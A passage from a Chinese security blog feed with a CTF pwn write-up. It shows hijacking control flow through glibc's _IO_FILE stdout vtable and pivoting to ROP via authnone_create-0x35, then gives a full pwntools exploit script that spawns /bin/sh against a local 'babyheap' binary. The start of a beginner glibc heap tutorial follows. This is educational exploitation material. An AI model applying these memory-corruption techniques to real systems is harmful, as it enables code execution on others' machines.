s6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/15/NlV2mfMtc4AjKBU.png" alt="Snipaste_2020-03-15_14-54-58.png"></p><h3 id="authnone-create利用">authnone_create利用</h3><p>这里用到了一个特别有用的 <strong>控制流劫持转ROP</strong> 的技术，就是 <strong>authnone_create - 0x35</strong> 这个位置（也叫 authnone_create_one + 139）</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/15/DNLFagP9CBHxc5m.png" alt="Snipaste_2020-03-15_14-54-58.png"></p><p>这个地方执行了以下操作：</p><ol><li>栈地址存放到了 rdi寄存器</li><li>再次调用一个偏移为 [rax+0x20] 的地址（即 [bss_name+0x8]可以构造成某个函数）</li><li>会检测 [rax + 0x38] 处是否为 NULL，若是，则会触发 ret</li></ol><p>如果我们在第二步调用了一个 <strong>gets</strong> 函数，就能成功向栈里写入 payload，从而实现ROP。</p><p>啰嗦一句，第二三步的 rax并不是 *vtable + 0x38， 它已经被刚刚的栈溢出进行了修改，这个值存放在[rsp+8]</p><p>这里我即将进行 gets，rdi确实就是栈顶的位置</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/15/8RHDOtNJ4KUWw72.png" alt="1.png"></p><p>这里 gets函数的细节我就不展示了，因为是照着 exp 一步步调试的，所以栈结构被我布置了一下，大家只需要知道这个方法可以刚好从栈顶开始覆盖就行。</p><p>可以看到 rax 被修改了，不再是之前的 0x602088，那么其实我这里构造的 [rax+0x38] 就是 [name+0x8]</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/15/vsj73LIOBGHR24y.png" alt="2.png"></p><p>rax == 0 刚好通过检测，将要执行 add rsp, 0x30， pop rbx，其实合并起来就是 add rsp, 0x38，在rop中添加padding即可。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/15/bmukjnTsCdSv53D.png" alt="3.png"></p><p>接下来就是自由的 rop 环节了，可以寻找 one_gadget ，也可以自行调用 system函数，这个取决于自己的喜好了。</p><p>不过可以直接 pop_rax_ret，把 rax 改成 0， 然后onegadget，我觉得更便捷。</p><h2 id="exp">exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./babyheap'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyheap'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, con)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'6. exit'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'username: '</span>, str(con))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(typ, idx, con)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'6. exit'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'1. secure edit\n2. insecure edit'</span>, str(typ))</span><br><span class="line">    p.sendlineafter(<span class="string">'index: '</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">'new username: '</span>, str(con))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ban</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'6. exit'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changename</span><span class="params">(con)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'6. exit'</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'enter new name:'</span>, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">'enter your name:'</span>, <span class="string">'mrh929'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'6. exit\n'</span>, <span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'your gift:\n'</span>)</span><br><span class="line">read_addr = int(p.recvuntil(<span class="string">'\n'</span>))</span><br><span class="line">libc_base = read_addr - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">stdout_vtable = libc_base + libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>] + <span class="number">0xd8</span></span><br><span class="line">bss_name = <span class="number">0x6020a0</span></span><br><span class="line">xchg_ret = libc_base + <span class="number">0x4727e</span></span><br><span class="line">gets_addr = libc_base + libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">authnone_create = libc_base + libc.symbols[<span class="string">'authnone_create'</span>] - <span class="number">0x35</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x21102</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">'read_addr:'</span> + hex(read_addr))</span><br><span class="line">success(<span class="string">'libc_base:'</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">'system_addr:'</span> + hex(system_addr))</span><br><span class="line">success(<span class="string">'stdout_vtable_addr:'</span> + hex(stdout_vtable))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = p64(stdout_vtable) + p64(gets_addr) + <span class="string">'/bin/sh\x00'</span>+ <span class="string">'a'</span>*(<span class="number">0x10</span><span class="number">-8</span>) + p64(authnone_create) </span><br><span class="line"><span class="comment">#gdb.attach(p, 'b *0x400c2b\nc\nb *&#123;&#125;\nc'.format(hex(libc_base+libc.symbols['authnone_create']-0x35)))</span></span><br><span class="line">changename(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = p64(bss_name - <span class="number">0x18</span>)[:<span class="number">6</span>]</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">12</span>, payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3 = p64(<span class="number">0</span>) + p64(<span class="number">0x602058</span><span class="number">-0x38</span>) + <span class="string">'b'</span>*<span class="number">0x28</span>  + p64(pop_rdi_ret) + p64(bss_name+<span class="number">0x10</span>) + p64(system_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(0.1)</span></span><br><span class="line"><span class="comment">#p.sendline(payload2)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结">总结</h2><p>通过本题我们学到了通过 _IO_FILE 来劫持控制流的方法，以及仅仅通过控制流劫持来触发ROP的构造方式（authnone_create-0x35）。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
    
      <category term="FILE_structure" scheme="https://mrh1s.top/tags/FILE-structure/"/>
    
  </entry>
  
  <entry>
    <title>堆入门（hgame2019 write up）</title>
    <link href="https://mrh1s.top/posts/d932a47c/"/>
    <id>https://mrh1s.top/posts/d932a47c/</id>
    <published>2020-02-29T17:54:01.000Z</published>
    <updated>2020-05-14T15:30:35.559Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>堆介绍</h1><h2 id="什么是堆">什么是堆</h2><p>在程序运行的过程中，我们会向操作系统申请内存来对数据进行存储。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由<strong>低地址向高地址</strong> （不同于栈）方向增长。堆块中的 user data 区域就是我们所申请的内存。用来管理堆的程序叫做堆管理器。</p><h2 id="堆管理器">堆管理器</h2><p>由于本人才疏学浅，只了解 Linux 的堆管理器。目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 <strong>malloc/free</strong> 函数来分配和释放内存块。</p><h2 id="malloc">malloc</h2><p>C语言中用于申请内存的函数，当我们调用函数之后，程序会返回一个<strong>内存地址</strong>，这块区域可供用户进行读写操作。</p><p>具体过程如下：</p><ol><li>堆管理器会向操作系统申请 <strong>132KB</strong> 的空间，称为 <strong>top chunk</strong> ，供 ptmalloc 对程序进行内存的分配。不论程序申请的空间为多少，堆管理器都会首先申请 132KB 。</li><li>堆管理器会对刚刚申请的空间进行切割，并将切割得到的堆块作为 malloc 的返回值送给用户程序。</li></ol><h2 id="free">free</h2><p>与malloc相对的函数，能将申请的堆块重新放入 ptmalloc 的分配区（<strong>main_arena</strong>）中。</p><ol><li>堆块是否属于 <strong>fastbin</strong> （后文会提到）？fastbin 是不会被合并的，其他的 bin 会被合并到 <strong>top chunk</strong> 中，但是注意：free 掉的堆块不会马上合并，要注意第二条。</li><li>top chunk 是否与该堆块相邻？与 top chunk 不相邻的堆块会进入相应的 bin 当中。</li><li>如果该堆块旁有一个已经 free 掉的非 fastbin 堆块，它会和那个堆块进行合并，这个过程称为 <strong>unlink</strong> 。</li><li>其他规则（还没学QAQ）</li></ol><h2 id="堆块结构">堆块结构</h2><p>这是一个正在使用的堆块的结构（以64位系统为例），从上到下地址<strong>依次增加</strong></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQ